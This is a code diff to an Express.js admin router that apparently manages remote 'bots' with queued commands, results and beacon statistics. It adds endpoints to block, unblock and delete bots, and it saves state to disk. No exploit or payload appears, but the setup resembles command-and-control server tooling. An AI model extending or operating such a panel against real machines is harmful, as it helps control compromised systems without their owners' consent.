@@ -31,6 +31,7 @@ router.get("/api/bots", requireAdmin, (_req, res) => {
     beaconFlagged:  b.beaconStats?.flagged || false,
     beaconInterval: b.beaconStats?.intervalMs || null,
     riskScore:      b.riskScore || 0,
+    blocked:        b.blocked || false,
   })));
 });
 
@@ -56,6 +57,30 @@ router.delete("/api/bot/:id/results", requireAdmin, (req, res) => {
   const bot = bots[req.params.id];
   if (!bot) return res.status(404).json({ error: "not found" });
   bot.results = [];
+  require("../persist").scheduleSave();
+  res.json({ ok: true });
+});
+
+// ── Block / unblock a bot ─────────────────────────────────────────────────────
+
+router.patch("/api/bot/:id/block", requireAdmin, (req, res) => {
+  const bot = bots[req.params.id];
+  if (!bot) return res.status(404).json({ error: "not found" });
+  bot.blocked = !bot.blocked;
+  if (bot.blocked) bot.pendingCmd = ""; // clear any queued command
+  require("../persist").scheduleSave();
+  console.log(`[admin]  bot=${req.params.id} blocked=${bot.blocked}`);
+  res.json({ ok: true, blocked: bot.blocked });
+});
+
+// ── Delete a bot (removes from dashboard; data saved to disk) ────────────────
+
+router.delete("/api/bot/:id", requireAdmin, (req, res) => {
+  const id = req.params.id;
+  if (!bots[id]) return res.status(404).json({ error: "not found" });
+  delete bots[id];
+  require("../persist").scheduleSave();
+  console.log(`[admin]  bot=${id} deleted`);
   res.json({ ok: true });
 });
 
